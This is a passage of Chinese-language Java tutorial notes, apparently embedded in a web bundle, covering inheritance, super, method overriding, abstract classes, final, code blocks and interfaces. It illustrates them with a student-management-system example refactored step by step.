System.out.println(num);\n      }\n  }\n  public class Demo1 {\n      public static void main(String[] args) {\n          Zi z = new Zi();\n          z.show();\t// 输出show方法中的局部变量30\n      }\n  }\n  ```\n\n### 2.2 super（掌握）\n\n- this&super关键字：\n  - this：代表本类对象的引用\n  - super：代表父类存储空间的标识(可以理解为父类对象引用)\n- this和super的使用分别\n  - 成员变量：\n    - this.成员变量    -   访问本类成员变量\n    - super.成员变量 -   访问父类成员变量\n  - 成员方法：\n    - this.成员方法  - 访问本类成员方法\n    - super.成员方法 - 访问父类成员方法\n- 构造方法：\n  - this(…)  -  访问本类构造方法\n  - super(…)  -  访问父类构造方法\n\n### 2.3 继承中构造方法的访问特点（理解）\n\n**注意：子类中所有的构造方法默认都会访问父类中无参的构造方法**\n\n​\t子类会继承父类中的数据，可能还会使用父类的数据。所以，子类初始化之前，一定要先完成父类数据的初始化，原因在于，每一个子类构造方法的第一条语句默认都是：super()\n\n**问题：如果父类中没有无参构造方法，只有带参构造方法，该怎么办呢？**\n\n```\n1. 通过使用super关键字去显示的调用父类的带参构造方法\n2. 子类通过this去调用本类的其他构造方法,本类其他构造方法再通过super去手动调用父类的带参的构造方法\n\n注意: this(…)super(…) 必须放在构造方法的第一行有效语句，并且二者不能共存\n```\n\n### 2.4 继承中成员方法的访问特点（掌握）\n\n通过子类对象访问一个方法\n\n1. 子类成员范围找\n2. 父类成员范围找\n3. 如果都没有就报错(不考虑父亲的父亲…)\n\n### 2.5 super内存图（理解）\n\n- 对象在堆内存中，会单独存在一块super区域，用来存放父类的数据 \n\n  ![01_super内存图](./img/java/basics/day12-继承.img/01_super内存图.png)\n\n### 2.6 方法重写（掌握）\n\n- 1、方法重写概念\n  - 子类出现了和父类中一模一样的方法声明（方法名一样，参数列表也必须一样）\n- 2、方法重写的应用场景\n  - 当子类需要父类的功能，而功能主体子类有自己特有内容时，可以重写父类中的方法，这样，即沿袭了父类的功能，又定义了子类特有的内容\n- 3、Override注解\n  - 用来检测当前的方法，是否是重写的方法，起到【校验】的作用\n\n### 2.7 方法重写的注意事项（掌握）\n\n- 方法重写的注意事项\n\n1. 私有方法不能被重写(父类私有成员子类是不能继承的)\n2. 子类方法访问权限不能更低(public > 默认 > 私有)\n3. 静态方法不能被重写,如果子类也有相同的方法,并不是重写的父类的方法\n\n- 示例代码\n\n```java\npublic class Fu {\n    private void show() {\n        System.out.println("Fu中show()方法被调用");\n    }\n\n    void method() {\n        System.out.println("Fu中method()方法被调用");\n    }\n}\n\npublic class Zi extends Fu {\n\n    /* 编译【出错】，子类不能重写父类私有的方法*/\n    @Override\n    private void show() {\n        System.out.println("Zi中show()方法被调用");\n    }\n   \n    /* 编译【出错】，子类重写父类方法的时候，访问权限需要大于等于父类 */\n    @Override\n    private void method() {\n        System.out.println("Zi中method()方法被调用");\n    }\n\n    /* 编译【通过】，子类重写父类方法的时候，访问权限需要大于等于父类 */\n    @Override\n    public void method() {\n        System.out.println("Zi中method()方法被调用");\n    }\n}\n```\n\n### 2.8 权限修饰符 (理解) \n\n![02_权限修饰符](./img/java/basics/day12-继承.img/02_权限修饰符.png)\n\n### 2.9 黑马信息管理系统使用继承改进 (掌握) \n\n+ 需求\n\n  把学生类和老师类共性的内容向上抽取,抽取到出一个 Person 父类,让学生类和老师类继承 Person 类\n\n+ 实现步骤\n\n  1. 抽取Person类\n\n  2. 优化StudentController类中，inputStudentInfo方法，将setXxx赋值方式，改进为构造方法初始化\n\n     注意：直接修改这种操作方式，不符合我们开发中的一个原则\n\n     ​\t开闭原则 ( 对扩展开放对修改关闭 ) : 尽量在不更改原有代码的前提下以完成需求 \n\n     解决：重新创建一个OtherStudentController类\n\n     编写新的inputStudentInfo方法\n\n  3. 根据StudentController类、OtherStudentController类，向上抽取出BaseStudentController类\n     再让StudentController类、OtherStudentController类，继承BaseStudentController类\n\n+ 代码实现\n\n  Person类及学生类和老师类\n\n  ```java\n  public class Person {\n      private String id;\n      private String name;\n      private String age;\n      private String birthday;\n\n      public Person() {\n      }\n\n      public Person(String id, String name, String age, String birthday) {\n          this.id = id;\n          this.name = name;\n          this.age = age;\n          this.birthday = birthday;\n      }\n\n      public String getId() {\n          return id;\n      }\n\n      public void setId(String id) {\n          this.id = id;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public String getAge() {\n          return age;\n      }\n\n      public void setAge(String age) {\n          this.age = age;\n      }\n\n      public String getBirthday() {\n          return birthday;\n      }\n\n      public void setBirthday(String birthday) {\n          this.birthday = birthday;\n      }\n  }\n  // Student类\n  public class Student extends Person {\n      public Student() {\n      }\n\n      public Student(String id, String name, String age, String birthday) {\n          super(id, name, age, birthday);\n      }\n  }\n  // Teacher类\n  public class Teacher extends Person {\n      public Teacher() {\n      }\n\n      public Teacher(String id, String name, String age, String birthday) {\n          super(id, name, age, birthday);\n      }\n  }\n  ```\n\n  BaseStudentController类\n\n  ```java\n  public abstract class BaseStudentController {\n      // 业务员对象\n      private StudentService studentService = new StudentService();\n\n      private Scanner sc = new Scanner(System.in);\n\n      // 开启学生管理系统, 并展示学生管理系统菜单\n      public void start() {\n          //Scanner sc = new Scanner(System.in);\n          studentLoop:\n          while (true) {\n              System.out.println("--------欢迎来到 <学生> 管理系统--------");\n              System.out.println("请输入您的选择: 1.添加学生  2.删除学生  3.修改学生  4.查看学生  5.退出");\n              String choice = sc.next();\n              switch (choice) {\n                  case "1":\n                      // System.out.println("添加");\n                      addStudent();\n                      break;\n                  case "2":\n                      // System.out.println("删除");\n                      deleteStudentById();\n                      break;\n                  case "3":\n                      // System.out.println("修改");\n                      updateStudent();\n                      break;\n                  case "4":\n                      // System.out.println("查询");\n                      findAllStudent();\n                      break;\n                  case "5":\n                      System.out.println("感谢您使用学生管理系统, 再见!");\n                      break studentLoop;\n                  default:\n                      System.out.println("您的输入有误, 请重新输入");\n                      break;\n              }\n          }\n      }\n\n      // 修改学生方法\n      public void updateStudent() {\n          String updateId = inputStudentId();\n          Student newStu = inputStudentInfo(updateId);\n          studentService.updateStudent(updateId, newStu);\n\n          System.out.println("修改成功!");\n      }\n\n      // 删除学生方法\n      public void deleteStudentById() {\n          String delId = inputStudentId();\n          // 3. 调用业务员中的deleteStudentById根据id, 删除学生\n          studentService.deleteStudentById(delId);\n          // 4. 提示删除成功\n          System.out.println("删除成功!");\n      }\n\n      // 查看学生方法\n      public void findAllStudent() {\n          // 1. 调用业务员中的获取方法, 得到学生的对象数组\n          Student[] stus = studentService.findAllStudent();\n          // 2. 判断数组的内存地址, 是否为null\n          if (stus == null) {\n              System.out.println("查无信息, 请添加后重试");\n              return;\n          }\n          // 3. 遍历数组, 获取学生信息并打印在控制台\n          System.out.println("学号\\t\\t姓名\\t年龄\\t生日");\n          for (int i = 0; i < stus.length; i++) {\n              Student stu = stus[i];\n              if (stu != null) {\n                  System.out.println(stu.getId() + "\\t" + stu.getName() + "\\t" + stu.getAge() + "\\t\\t" + stu.getBirthday());\n              }\n          }\n      }\n\n      // 添加学生方法\n      public void addStudent() {\n          // StudentService studentService = new StudentService();\n          // 1. 键盘接收学生信息\n          String id;\n          while (true) {\n              System.out.println("请输入学生id:");\n              id = sc.next();\n              boolean flag = studentService.isExists(id);\n              if (flag) {\n                  System.out.println("学号已被占用, 请重新输入");\n              } else {\n                  break;\n              }\n          }\n\n          Student stu = inputStudentInfo(id);\n\n          // 3. 将学生对象,传递给StudentService(业务员)中的addStudent方法\n          boolean result = studentService.addStudent(stu);\n          // 4. 根据返回的boolean类型结果, 在控制台打印成功\\失败\n          if (result) {\n              System.out.println("添加成功");\n          } else {\n              System.out.println("添加失败");\n          }\n      }\n\n      // 键盘录入学生id\n      public String inputStudentId() {\n          String id;\n          while (true) {\n              System.out.println("请输入学生id:");\n              id = sc.next();\n              boolean exists = studentService.isExists(id);\n              if (!exists) {\n                  System.out.println("您输入的id不存在, 请重新输入:");\n              } else {\n                  break;\n              }\n          }\n          return id;\n      }\n\n      // 键盘录入学生信息\n      // 开闭原则: 对扩展内容开放, 对修改内容关闭\n    public Student inputStudentInfo(String id){\n      return null;\n    }\n  }\n  ```\n\n  StudentController类\n\n  ```java\n  public class StudentController extends BaseStudentController {\n\n      private Scanner sc = new Scanner(System.in);\n\n      // 键盘录入学生信息\n      // 开闭原则: 对扩展内容开放, 对修改内容关闭\n      @Override\n      public Student inputStudentInfo(String id) {\n          System.out.println("请输入学生姓名:");\n          String name = sc.next();\n          System.out.println("请输入学生年龄:");\n          String age = sc.next();\n          System.out.println("请输入学生生日:");\n          String birthday = sc.next();\n          Student stu = new Student();\n          stu.setId(id);\n          stu.setName(name);\n          stu.setAge(age);\n          stu.setBirthday(birthday);\n          return stu;\n      }\n  }\n  ```\n\n  OtherStudentController类\n\n  ```java\n  public class OtherStudentController extends BaseStudentController {\n\n      private Scanner sc = new Scanner(System.in);\n\n      // 键盘录入学生信息\n      // 开闭原则: 对扩展内容开放, 对修改内容关闭\n      @Override\n      public Student inputStudentInfo(String id) {\n          System.out.println("请输入学生姓名:");\n          String name = sc.next();\n          System.out.println("请输入学生年龄:");\n          String age = sc.next();\n          System.out.println("请输入学生生日:");\n          String birthday = sc.next();\n          Student stu = new Student(id,name,age,birthday);\n          return stu;\n      }\n  }\n  ```\n\n## 3.抽象类\n\n### 3.1抽象类的概述（理解）\n\n​\t当我们在做子类共性功能抽取时，有些方法在父类中并没有具体的体现，这个时候就需要抽象类了！\n\n​\t在Java中，一个没有方法体的方法应该定义为抽象方法，而类中如果有抽象方法，该类必须定义为抽象类！\n\n### 3.2抽象类的特点（记忆）\n\n- 抽象类和抽象方法必须使用 abstract 关键字修饰\n\n  ```java\n  //抽象类的定义\n  public abstract class 类名 {}\n\n  //抽象方法的定义\n  public abstract void eat();\n  ```\n\n- 抽象类中不一定有抽象方法，有抽象方法的类一定是抽象类\n\n- 抽象类不能实例化\n\n- 抽象类可以有构造方法\n\n- 抽象类的子类\n\n  ​\t要么重写抽象类中的所有抽象方法\n\n  ​\t要么是抽象类\n\n### 3.3抽象类的案例（应用）\n\n- 案例需求\n\n  ​\t定义猫类(Cat)和狗类(Dog)\n\n  ​\t猫类成员方法：eat（猫吃鱼）drink（喝水…）\n\n  ​\t狗类成员方法：eat（狗吃肉）drink（喝水…）\n\n- 实现步骤\n\n  1. 猫类和狗类中存在共性内容，应向上抽取出一个动物类（Animal）\n  2. 父类Animal中，无法将 eat 方法具体实现描述清楚，所以定义为抽象方法\n  3. 抽象方法需要存活在抽象类中，将Animal定义为抽象类\n  4. 让 Cat 和 Dog 分别继承 Animal，重写eat方法\n  5. 测试类中创建 Cat 和 Dog 对象，调用方法测试\n\n- 代码实现\n\n  - 动物类\n\n  ```java\n  public abstract class Animal {\n      public void drink(){\n          System.out.println("喝水");\n      }\n\n      public Animal(){\n\n      }\n\n      public abstract void eat();\n  }\n  ```\n\n  - 猫类\n\n  ```java\n  public class Cat extends Animal {\n      @Override\n      public void eat() {\n          System.out.println("猫吃鱼");\n      }\n  }\n  ```\n\n  - 狗类\n\n  ```java\n  public class Dog extends Animal {\n      @Override\n      public void eat() {\n          System.out.println("狗吃肉");\n      }\n  }\n  ```\n\n  - 测试类\n\n  ```java\n  public static void main(String[] args) {\n          Dog d = new Dog();\n          d.eat();\n          d.drink();\n\n          Cat c = new Cat();\n          c.drink();\n          c.eat();\n\n          //Animal a = new Animal();\n          //a.eat();\n      }\n  ```\n\n### 3.4模板设计模式 \n\n+ 设计模式\n\n  设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。\n  使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性、程序的重用性。\n\n+ 模板设计模式\n\n  把抽象类整体就可以看做成一个模板，模板中不能决定的东西定义成抽象方法\n  让使用模板的类（继承抽象类的类）去重写抽象方法实现需求\n\n+ 模板设计模式的优势\n\n  模板已经定义了通用结构，使用者只需要关心自己需要实现的功能即可\n\n+ 示例代码\n\n  模板类\n\n  ```java\n  /*\n      作文模板类\n   */\n  public abstract class CompositionTemplate {\n\n      public final void write(){\n          System.out.println("<<我的爸爸>>");\n\n          body();\n\n          System.out.println("啊~ 这就是我的爸爸");\n\n      }\n\n      public abstract void body();\n  }\n  ```\n\n  实现类A\n\n  ```java\n  public class Tom extends CompositionTemplate {\n\n      @Override\n      public void body() {\n          System.out.println("那是一个秋天, 风儿那么缠绵,记忆中, " +\n                  "那天爸爸骑车接我放学回家,我的脚卡在了自行车链当中, 爸爸蹬不动,他就站起来蹬...");\n      }\n  }\n  ```\n\n  实现类B\n\n  ```java\n  public class Tony extends CompositionTemplate {\n      @Override\n      public void body() {\n\n      }\n\n      /*public void write(){\n\n      }*/\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class Test {\n      public static void main(String[] args) {\n          Tom t = new Tom();\n          t.write();\n      }\n  }\n  ```\n\n### 3.5final（应用）\n\n- fianl关键字的作用\n\n  - final代表最终的意思，可以修饰成员方法，成员变量，类\n\n- final修饰类、方法、变量的效果  \n\n  - fianl修饰类：该类不能被继承（不能有子类，但是可以有父类）\n\n  - final修饰方法：该方法不能被重写\n\n  - final修饰变量：表明该变量是一个常量，不能再次赋值\n\n    + 变量是基本类型,不能改变的是值\n\n    + 变量是引用类型,不能改变的是地址值,但地址里面的内容是可以改变的\n\n    + 举例\n\n      ```java\n      public static void main(String[] args){\n          final Student s = new Student(23);\n        \ts = new Student(24);  // 错误\n       \ts.setAge(24);  // 正确\n      }\n      ```\n\n### 3.6黑马信息管理系统使用抽象类改进 (应用)\n\n+ 需求\n\n  1. 使用抽象类的思想，将BaseStudentController 中的 inputStudentInfo 方法，定义为抽象方法\n  2. 将不希望子类重写的方法，使用 final 进行修饰\n\n+ 代码实现\n\n  BaseStudentController类\n\n  ```java\n  public abstract class BaseStudentController {\n      // 业务员对象\n      private StudentService studentService = new StudentService();\n\n      private Scanner sc = new Scanner(System.in);\n\n      // 开启学生管理系统, 并展示学生管理系统菜单\n      public final void start() {\n          //Scanner sc = new Scanner(System.in);\n          studentLoop:\n          while (true) {\n              System.out.println("--------欢迎来到 <学生> 管理系统--------");\n              System.out.println("请输入您的选择: 1.添加学生  2.删除学生  3.修改学生  4.查看学生  5.退出");\n              String choice = sc.next();\n              switch (choice) {\n                  case "1":\n                      // System.out.println("添加");\n                      addStudent();\n                      break;\n                  case "2":\n                      // System.out.println("删除");\n                      deleteStudentById();\n                      break;\n                  case "3":\n                      // System.out.println("修改");\n                      updateStudent();\n                      break;\n                  case "4":\n                      // System.out.println("查询");\n                      findAllStudent();\n                      break;\n                  case "5":\n                      System.out.println("感谢您使用学生管理系统, 再见!");\n                      break studentLoop;\n                  default:\n                      System.out.println("您的输入有误, 请重新输入");\n                      break;\n              }\n          }\n      }\n\n      // 修改学生方法\n      public final void updateStudent() {\n          String updateId = inputStudentId();\n          Student newStu = inputStudentInfo(updateId);\n          studentService.updateStudent(updateId, newStu);\n\n          System.out.println("修改成功!");\n      }\n\n      // 删除学生方法\n      public final void deleteStudentById() {\n          String delId = inputStudentId();\n          // 3. 调用业务员中的deleteStudentById根据id, 删除学生\n          studentService.deleteStudentById(delId);\n          // 4. 提示删除成功\n          System.out.println("删除成功!");\n      }\n\n      // 查看学生方法\n      public final void findAllStudent() {\n          // 1. 调用业务员中的获取方法, 得到学生的对象数组\n          Student[] stus = studentService.findAllStudent();\n          // 2. 判断数组的内存地址, 是否为null\n          if (stus == null) {\n              System.out.println("查无信息, 请添加后重试");\n              return;\n          }\n          // 3. 遍历数组, 获取学生信息并打印在控制台\n          System.out.println("学号\\t\\t姓名\\t年龄\\t生日");\n          for (int i = 0; i < stus.length; i++) {\n              Student stu = stus[i];\n              if (stu != null) {\n                  System.out.println(stu.getId() + "\\t" + stu.getName() + "\\t" + stu.getAge() + "\\t\\t" + stu.getBirthday());\n              }\n          }\n      }\n\n      // 添加学生方法\n      public final void addStudent() {\n          // StudentService studentService = new StudentService();\n          // 1. 键盘接收学生信息\n          String id;\n          while (true) {\n              System.out.println("请输入学生id:");\n              id = sc.next();\n              boolean flag = studentService.isExists(id);\n              if (flag) {\n                  System.out.println("学号已被占用, 请重新输入");\n              } else {\n                  break;\n              }\n          }\n\n          Student stu = inputStudentInfo(id);\n\n          // 3. 将学生对象,传递给StudentService(业务员)中的addStudent方法\n          boolean result = studentService.addStudent(stu);\n          // 4. 根据返回的boolean类型结果, 在控制台打印成功\\失败\n          if (result) {\n              System.out.println("添加成功");\n          } else {\n              System.out.println("添加失败");\n          }\n      }\n\n      // 键盘录入学生id\n      public String inputStudentId() {\n          String id;\n          while (true) {\n              System.out.println("请输入学生id:");\n              id = sc.next();\n              boolean exists = studentService.isExists(id);\n              if (!exists) {\n                  System.out.println("您输入的id不存在, 请重新输入:");\n              } else {\n                  break;\n              }\n          }\n          return id;\n      }\n\n      // 键盘录入学生信息\n      // 开闭原则: 对扩展内容开放, 对修改内容关闭\n    public abstract Student inputStudentInfo(String id);\n  }\n  ```\n\n## 4.代码块 \n\n### 4.1代码块概述 (理解)\n\n在Java中，使用 { } 括起来的代码被称为代码块\n\n### 4.2代码块分类 (理解) \n\n+ 局部代码块\n\n  + 位置: 方法中定义\n\n  + 作用: 限定变量的生命周期，及早释放，提高内存利用率\n\n  + 示例代码\n\n    ```java\n    public class Test {\n        /*\n            局部代码块\n                位置：方法中定义\n                作用：限定变量的生命周期，及早释放，提高内存利用率\n         */\n        public static void main(String[] args) {\n            {\n                int a = 10;\n                System.out.println(a);\n            }\n\n           // System.out.println(a);\n        }\n    }\n    ```\n\n+ 构造代码块\n\n  + 位置: 类中方法外定义\n\n  + 特点: 每次构造方法执行的时，都会执行该代码块中的代码，并且在构造方法执行前执行\n\n  + 作用: 将多个构造方法中相同的代码，抽取到构造代码块中，提高代码的复用性\n\n  + 示例代码\n\n    ```java\n    public class Test {\n        /*\n            构造代码块:\n                位置：类中方法外定义\n                特点：每次构造方法执行的时，都会执行该代码块中的代码，并且在构造方法执行前执行\n                作用：将多个构造方法中相同的代码，抽取到构造代码块中，提高代码的复用性\n         */\n        public static void main(String[] args) {\n            Student stu1 = new Student();\n            Student stu2 = new Student(10);\n        }\n    }\n\n    class Student {\n\n        {\n            System.out.println("好好学习");\n        }\n\n        public Student(){\n            System.out.println("空参数构造方法");\n        }\n\n        public Student(int a){\n            System.out.println("带参数构造方法...........");\n        }\n    }\n    ```\n\n+ 静态代码块\n\n  + 位置: 类中方法外定义\n\n  + 特点: 需要通过static关键字修饰，随着类的加载而加载，并且只执行一次\n\n  + 作用: 在类加载的时候做一些数据初始化的操作\n\n  + 示例代码\n\n    ```java\n    public class Test {\n        /*\n            静态代码块:\n                位置：类中方法外定义\n                特点：需要通过static关键字修饰，随着类的加载而加载，并且只执行一次\n                作用：在类加载的时候做一些数据初始化的操作\n         */\n        public static void main(String[] args) {\n            Person p1 = new Person();\n            Person p2 = new Person(10);\n        }\n    }\n\n    class Person {\n        static {\n            System.out.println("我是静态代码块, 我执行了");\n        }\n\n        public Person(){\n            System.out.println("我是Person类的空参数构造方法");\n        }\n\n        public Person(int a){\n            System.out.println("我是Person类的带...........参数构造方法");\n        }\n    }\n    ```\n\n### 4.3黑马信息管理系统使用代码块改进 (应用) \n\n+ 需求\n\n  使用静态代码块，初始化一些学生数据\n\n+ 实现步骤\n\n  1. 在StudentDao类中定义一个静态代码块，用来初始化一些学生数据\n  2. 将初始化好的学生数据存储到学生数组中\n\n+ 示例代码\n\n  StudentDao类\n\n  ```java\n  public class StudentDao {\n      // 创建学生对象数组\n      private static Student[] stus = new Student[5];\n\n      static {\n          Student stu1 = new Student("heima001","张三","23","1999-11-11");\n          Student stu2 = new Student("heima002","李四","24","2000-11-11");\n\n          stus[0] = stu1;\n          stus[1] = stu2;\n      }\n\n      // 添加学生方法\n      public boolean addStudent(Student stu) {\n\n          // 2. 添加学生到数组\n          //2.1 定义变量index为-1，假设数组已经全部存满，没有null的元素\n          int index = -1;\n          //2.2 遍历数组取出每一个元素，判断是否是null\n          for (int i = 0; i < stus.length; i++) {\n              Student student = stus[i];\n              if(student == null){\n                  index = i;\n                  //2.3 如果为null，让index变量记录当前索引位置，并使用break结束循环遍历\n                  break;\n              }\n          }\n\n          // 3. 返回是否添加成功的boolean类型状态\n          if(index == -1){\n              // 装满了\n              return false;\n          }else{\n              // 没有装满, 正常添加, 返回true\n              stus[index] = stu;\n              return true;\n          }\n      }\n      // 查看学生方法\n      public Student[] findAllStudent() {\n          return stus;\n      }\n\n      public void deleteStudentById(String delId) {\n          // 1. 查找id在容器中所在的索引位置\n          int index = getIndex(delId);\n          // 2. 将该索引位置,使用null元素进行覆盖\n          stus[index] = null;\n      }\n\n      public int getIndex(String id){\n          int index = -1;\n          for (int i = 0; i < stus.length; i++) {\n              Student stu = stus[i];\n              if(stu != null && stu.getId().equals(id)){\n                  index = i;\n                  break;\n              }\n          }\n          return index;\n      }\n\n      public void updateStudent(String updateId, Student newStu) {\n          // 1. 查找updateId, 在容器中的索引位置\n          int index = getIndex(updateId);\n          // 2. 将该索引位置, 使用新的学生对象替换\n          stus[index] = newStu;\n      }\n  }\n  ```\n\n  ​\n\n',an='## 1.接口\n\n### 1.1黑马信息管理系统集合改进 (应用)\n\n+ 使用数组容器的弊端\n\n  1. 容器长度是固定的，不能根据添加功能自动增长\n  2. 没有提供用于赠删改查的方法\n\n+ 优化步骤\n\n  1. 创建新的StudentDao类，OtherStudentDao\n\n  2. 创建ArrayList集合容器对象\n\n  3. OtherStudentDao中的方法声明，需要跟StudentDao保持一致\n\n     注意：如果不一致，StudentService中的代码就需要进行修改\n\n  4. 完善方法（添加、删除、修改、查看）\n\n  5. 替换StudentService中的Dao对象\n\n+ 代码实现\n\n  OtherStudentDao类\n\n  ```java\n  public class OtherStudentDao {\n      // 集合容器\n      private static ArrayList<Student> stus = new ArrayList<>();\n\n      static {\n          Student stu1 = new Student("heima001","张三","23","1999-11-11");\n          Student stu2 = new Student("heima002","李四","24","2000-11-11");\n\n          stus.add(stu1);\n          stus.add(stu2);\n      }\n\n      // 添加学生方法\n      public boolean addStudent(Student stu) {\n         stus.add(stu);\n         return true;\n      }\n\n      // 查看学生方法\n      public Student[] findAllStudent() {\n\n          Student[] students = new Student[stus.size()];\n\n          for (int i = 0; i < students.length; i++) {\n              students[i] = stus.get(i);\n          }\n\n          return students;\n      }\n\n      public void deleteStudentById(String delId) {\n          // 1. 查找id在容器中所在的索引位置\n          int index = getIndex(delId);\n          stus.remove(index);\n      }\n\n      public int getIndex(String id){\n          int index = -1;\n          for (int i = 0; i < stus.size(); i++) {\n              Student stu = stus.get(i);\n              if(stu != null && stu.getId().equals(id)){\n                  index = i;\n                  break;\n              }\n          }\n          return index;\n      }\n\n      public void updateStudent(String updateId, Student newStu) {\n          // 1. 查找updateId, 在容器中的索引位置\n          int index = getIndex(updateId);\n          stus.set(index, newStu);\n      }\n  }\n  ```\n\n  StudentService类\n\n  ```java\n  public class StudentService {\n      // 创建StudentDao (库管)\n       private OtherStudentDao studentDao = new OtherStudentDao();\n    \t// 其他方法没有变化,此处省略...\n  }    \n  ```\n\n### 1.2黑马信息管理系统抽取Dao (应用)\n\n+ 优化步骤\n\n  1. 将方法向上抽取，抽取出一个父类 （ BaseStudentDao ）\n  2. 方法的功能实现在父类中无法给出具体明确，定义为抽象方法\n  3. 让两个类分别继承 BaseStudentDao ，重写内部抽象方法\n\n+ 代码实现\n\n  BaseStudentDao类\n\n  ```java\n  public abstract class BaseStudentDao {\n      // 添加学生方法\n      public abstract boolean addStudent(Student stu);\n      // 查看学生方法\n      public abstract Student[] findAllStudent();\n      // 删除学生方法\n      public abstract void deleteStudentById(String delId);\n      // 根据id找索引方法\n      public abstract int getIndex(String id);\n      // 修改学生方法\n      public abstract void updateStudent(String updateId, Student newStu);\n  }\n  ```\n\n  StudentDao类\n\n  ```java\n  public class StudentDao extends BaseStudentDao {\n    // 其他内容不变,此处省略\n  }\n  ```\n\n  OtherStudentDao类\n\n  ```java\n  public class OtherStudentDao extends BaseStudentDao {\n    // 其他内容不变,此处省略\n  }\n  ```\n\n### 1.3接口的概述（理解）\n\n+ 接口就是一种公共的规范标准，只要符合规范标准，大家都可以通用。\n+ Java中接口存在的两个意义\n  1. 用来定义规范\n  2. 用来做功能的拓展\n\n### 1.4接口的特点（记忆）\n\n- 接口用关键字interface修饰\n\n  ```java\n  public interface 接口名 {} \n  ```\n\n- 类实现接口用implements表示\n\n  ```java\n  public class 类名 implements 接口名 {}\n  ```\n\n- 接口不能实例化\n\n  ​\t我们可以创建接口的实现类对象使用\n\n- 接口的子类\n\n  ​\t要么重写接口中的所有抽象方法\n\n  ​\t要么子类也是抽象类\n\n### 1.5接口的成员特点（记忆）\n\n- 成员特点\n\n  - 成员变量\n\n    ​\t 只能是常量\n    ​\t 默认修饰符：public static final\n\n  - 构造方法\n\n    ​\t没有，因为接口主要是扩展功能的，而没有具体存在\n\n  - 成员方法\n\n    ​\t只能是抽象方法\n\n    ​\t默认修饰符：public abstract\n\n    ​\t关于接口中的方法，JDK8和JDK9中有一些新特性，后面再讲解\n\n- 代码演示\n\n  - 接口\n\n  ```java\n  public interface Inter {\n      public static final int NUM = 10;\n\n      public abstract void show();\n  }\n  ```\n\n  - 实现类\n\n  ```java\n  class InterImpl implements Inter{\n\n      public void method(){\n          // NUM = 20;\n          System.out.println(NUM);\n      }\n\n      public void show(){\n\n      }\n  }\n  ```\n\n  - 测试类\n\n  ```java\n  public class TestInterface {\n      /*\n          成员变量: 只能是常量 系统会默认加入三个关键字\n                      public static final\n          构造方法: 没有\n          成员方法: 只能是抽象方法, 系统会默认加入两个关键字\n                      public abstract\n       */\n      public static void main(String[] args) {\n          System.out.println(Inter.NUM);\n      }\n    \n  }\n  ```\n\n### 1.6类和接口的关系（记忆）\n\n- 类与类的关系\n\n  ​\t继承关系，只能单继承，但是可以多层继承\n\n- 类与接口的关系\n\n  ​\t实现关系，可以单实现，也可以多实现，还可以在继承一个类的同时实现多个接口\n\n- 接口与接口的关系\n\n  ​\t继承关系，可以单继承，也可以多继承\n\n### 1.7黑马信息管理系统使用接口改进 (应用)\n\n+ 实现步骤\n\n  1. 将 BaseStudentDao 改进为一个接口\n  2. 让 StudentDao 和 OtherStudentDao 去实现这个接口\n\n+ 代码实现\n\n  BaseStudentDao接口\n\n  ```java\n  public interface BaseStudentDao {\n      // 添加学生方法\n      public abstract boolean addStudent(Student stu);\n      // 查看学生方法\n      public abstract Student[] findAllStudent();\n      // 删除学生方法\n      public abstract void deleteStudentById(String delId);\n      // 根据id找索引方法\n      public abstract int getIndex(String id);\n      // 修改学生方法\n      public abstract void updateStudent(String updateId, Student newStu);\n  }\n  ```\n\n  StudentDao类\n\n  ```java\n  public class StudentDao implements BaseStudentDao {\n    // 其他内容不变,此处省略\n  }\n  ```\n\n  OtherStudentDao类\n\n  ```java\n  public class OtherStudentDao implements BaseStudentDao {\n    // 其他内容不变,此处省略\n  }\n  ```\n\n### 1.8黑马信息管理系统解耦合改进 (应用) \n\n+ 实现步骤\n\n  1. 创建factory包，创建 StudentDaoFactory（工厂类）\n  2. 提供 static 修改的 getStudentDao 方法，该方法用于创建StudentDao对象并返回\n\n+ 代码实现\n\n  StudentDaoFactory类\n\n  ```java\n  public class StudentDaoFactory {\n      public static OtherStudentDao getStudentDao(){\n          return new OtherStudentDao();\n      }\n  }\n  ```\n\n  StudentService类\n\n  ```java\n  public class StudentService {\n      // 创建StudentDao (库管)\n      // private OtherStudentDao studentDao = new OtherStudentDao();\n\n      // 通过学生库管工厂类, 获取库管对象\n      private OtherStudentDao studentDao = StudentDaoFactory.getStudentDao();\n  }  \n  ```\n\n## 2.接口组成更新\n\n### 2.1接口组成更新概述【理解】\n\n- 常量\n\n  public static final\n\n- 抽象方法\n\n  public abstract\n\n- 默认方法(Java 8)\n\n- 静态方法(Java 8)\n\n- 私有方法(Java 9)\n\n### 2.2接口中默认方法【应用】\n\n- 格式\n\n  public default 返回值类型 方法名(参数列表) {   }\n\n- 作用\n\n  解决接口升级的问题\n\n- 范例\n\n  ```java\n  public default void show3() { \n  }\n  ```\n\n- 注意事项\n\n  - 默认方法不是抽象方法，所以不强制被重写。但是可以被重写，重写的时候去掉default关键字\n  - public可以省略，default不能省略\n  - 如果实现了多个接口，多个接口中存在相同的方法声明，子类就必须对该方法进行重写\n\n### 2.3接口中静态方法【应用】\n\n- 格式\n\n  public static 返回值类型 方法名(参数列表) {   }\n\n- 范例\n\n  ```java\n  public static void show() {\n  }\n  ```\n\n- 注意事项\n\n  - 静态方法只能通过接口名调用，不能通过实现类名或者对象名调用\n  - public可以省略，static不能省略\n\n### 2.4接口中私有方法【应用】\n\n- 私有方法产生原因\n\n  Java 9中新增了带方法体的私有方法，这其实在Java 8中就埋下了伏笔：Java 8允许在接口中定义带方法体的默认方法和静态方法。这样可能就会引发一个问题：当两个默认方法或者静态方法中包含一段相同的代码实现时，程序必然考虑将这段实现代码抽取成一个共性方法，而这个共性方法是不需要让别人使用的，因此用私有给隐藏起来，这就是Java 9增加私有方法的必然性\n\n- 定义格式\n\n  - 格式1\n\n    private 返回值类型 方法名(参数列表) {   }\n\n  - 范例1\n\n    ```java\n    private void show() {  \n    }\n    ```\n\n  - 格式2\n\n    private static 返回值类型 方法名(参数列表) {   }\n\n  - 范例2\n\n    ```java\n    private static void method() {  \n    }\n    ```\n\n- 注意事项\n\n  - 默认方法可以调用私有的静态方法和非静态方法\n  - 静态方法只能调用私有的静态方法\n\n## 3.多态 \n\n### 3.1多态的概述（记忆）\n\n- 什么是多态\n\n  ​\t同一个对象，在不同时刻表现出来的不同形态\n\n- 多态的前提\n\n  - 要有继承或实现关系\n  - 